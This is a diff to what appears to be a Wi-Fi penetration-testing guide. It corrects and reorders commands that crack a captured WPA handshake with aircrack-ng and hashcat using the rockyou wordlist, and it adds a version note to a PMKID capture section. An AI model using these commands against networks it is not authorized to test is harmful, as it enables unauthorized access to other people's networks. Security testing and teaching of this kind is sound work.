@@ -86,13 +86,13 @@ sudo aircrack-ng handshake-01.cap        # look for "1 handshake" + your ESSID
 
 ```bash
 # CPU dictionary attack with aircrack-ng
+sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz    # once, if still gzipped
 sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:11:22:33 handshake-01.cap
-sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz    # if still gzipped
 
 # GPU-accelerated with hashcat (mode 22000)
 hcxpcapngtool -o hs.22000 handshake-01.cap
 hashcat -m 22000 hs.22000 /usr/share/wordlists/rockyou.txt
-hashcat -m 22000 hs.22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 22000 hs.22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
 
 | aircrack-ng flag | Meaning |
@@ -103,6 +103,8 @@ hashcat -m 22000 hs.22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 | `-l <file>` | Write found key to file |
 
 ## PMKID attack (clientless, no deauth)
+
+Syntax for hcxdumptool 7.x (Kali ships 7.1.2; check with `hcxdumptool --version`).
 
 ```bash
 sudo systemctl stop NetworkManager wpa_supplicant      # hcxdumptool owns the radio
